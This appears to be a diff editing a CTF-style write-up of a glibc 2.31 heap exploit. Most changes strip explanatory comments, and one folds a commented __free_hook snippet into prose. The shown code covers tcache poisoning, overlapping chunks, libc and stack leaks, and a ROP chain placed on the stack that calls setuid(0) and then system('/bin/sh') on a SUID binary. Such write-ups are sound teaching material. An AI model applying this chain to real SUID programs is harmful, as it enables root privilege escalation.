@@ -132,9 +132,9 @@ The steps are below.
 ## heap leak
 
 ```python
-alloc()   # slot 0
-alloc()   # slot 1
-alloc()   # slot 2
+alloc()
+alloc()
+alloc()
 
 free_slot(0)
 free_slot(1)
@@ -163,8 +163,8 @@ edit(1, p64(heap + 0x70))
 `heap + 0x70` lands right at the start of chunk2's user data. tcache now thinks the chain is: `chunk1 --> (heap+0x70)`
 
 ```python
-alloc()           # pops chunk1 from tcache
-chunk_4 = alloc() # pops the fake entry at heap+0x70, overlapping with chunk2
+alloc()
+chunk_4 = alloc()
 ```
 
 we now have a chunk (`chunk_4`) that overlaps with chunk2. anything we write there overwrites chunk2's metadata.
@@ -182,9 +182,9 @@ this sets chunk2's `prev_size` to 0 and `size` to 0x501. the allocator now think
 but we need the memory after this fake chunk to look valid, so we fill it:
 
 ```python
-for i in range(0x500 // 0x40):   # 20 allocations
+for i in range(0x500 // 0x40):
     alloc()
-alloc()  # one more to act as a top chunk boundary
+alloc()
 ```
 
 ## libc leak
@@ -212,14 +212,7 @@ unsorted_bin   = main_arena + 0x60   = 0x1ecbe0
 
 ## why not __free_hook?
 
-glibc 2.31 still has `__free_hook` (at offset `0x1eee48`). you might think the easy play is:
-
-```python
-# tcache poison --> write system() to __free_hook
-# free a chunk containing "/bin/sh" --> system("/bin/sh")
-```
-
-I tried this first, as shown in the commented code. The problem is that this binary is SUID and uses `setreuid()` in init. When `system()` spawns `/bin/sh`, the shell checks whether ruid != euid and drops privileges. Even though init sets ruid = euid, SUID shell behavior can still cause problems.
+glibc 2.31 still has `__free_hook` (at offset `0x1eee48`). you might think the easy play is to write `system()` to it and free a chunk containing `/bin/sh`. I tried this first. The problem is that this binary is SUID and uses `setreuid()` in init. When `system()` spawns `/bin/sh`, the shell checks whether ruid != euid and drops privileges. Even though init sets ruid = euid, SUID shell behavior can still cause problems.
 
 so instead, we go for a ROP chain that explicitly calls `setuid(0)` before `system("/bin/sh")`.
 
@@ -236,7 +229,7 @@ free_slot(idx)
 
 edit(idx, p64(libc.symbols.environ))
 alloc()
-stack_leak_idx = alloc()  # this chunk is at &environ
+stack_leak_idx = alloc()
 
 stack_leak = view(stack_leak_idx)
 stack_leak = u64(stack_leak[:8].ljust(8, b"\x00"))
@@ -290,13 +283,13 @@ free_slot(poison)
 free_slot(poison + 1)
 free_slot(poison + 2)
 
-edit(poison + 1, p64(ret_addr))  # poison FD --> stack return address
+edit(poison + 1, p64(ret_addr))
 
 poison = int(alloc())
 alloc()
-alloc()                          # this chunk lands on the stack
+alloc()
 
-edit(poison + 2, chain)          # overwrite return address with ROP chain
+edit(poison + 2, chain)
 ```
 
 when main returns, it pops our ROP chain off the stack:
